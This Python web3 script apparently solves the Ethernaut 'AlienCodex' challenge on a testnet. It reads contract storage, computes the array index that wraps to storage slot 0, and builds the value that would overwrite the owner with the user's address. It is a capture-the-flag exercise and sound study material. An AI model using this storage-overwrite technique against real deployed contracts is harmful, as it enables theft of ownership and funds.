
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_utils import remove_0x_prefix, to_hex
import os
import json
from eth_abi import abi


class AlienCodex():
    def __init__(self):

        # read sensitive data from file
        curr_path = os.path.dirname(os.path.abspath(__file__)) + '/'
        try:
            with open(curr_path + '../secret.json') as json_file:
                self.secret_json = json.load(json_file)
        except:
            print('secret.json missing')
            exit()

        # init web3
        alchemy_url = "https://polygon-mumbai.g.alchemy.com/v2/" + self.secret_json['alpchemy']['api_key']
        self.w3 = Web3(Web3.HTTPProvider(alchemy_url))
        self.w3.middleware_onion.inject(geth_poa_middleware, layer=0)
        
        aliencodex_contract_addr = self.secret_json['19_aliencodex_contract_addr']

        # contact and owner address stored at storage intex 0
        index_contact_and_owner = 0
        storage = self.w3.eth.get_storage_at(aliencodex_contract_addr, index_contact_and_owner).hex()
        print("is contacted & owner = ", storage)

        # length of the array at storage index 1
        array_storage_idx = 1
        storage = self.w3.eth.get_storage_at(aliencodex_contract_addr, array_storage_idx).hex()
        print("array length = ", storage)

        # key for the first element of the array: 
        array_index_hex = f'{array_storage_idx:{0}>{64}}'
        array_storage_key = to_hex(Web3.keccak(hexstr=array_index_hex))
        # print(array_storage_key)
        
        # we need to find the array index which leads to storage index 0 where the owner address stored
        array_storage_key_dec = int(array_storage_key, base=16)
        max_array_storage_key_dec = int(f'0x{"f"*64}', base=16)
        index_to_revise = max_array_storage_key_dec-array_storage_key_dec+1
        print("index to revise=", index_to_revise)
        
        # specify bytes to revise
        new_owner = remove_0x_prefix(self.secret_json['my_addr'])
        contacted = '1'

        revise_bytes = f'0x{contacted + new_owner:{0}>{64}}'
        print(index_to_revise, ',', revise_bytes)


if __name__ == '__main__':
    va = AlienCodex()
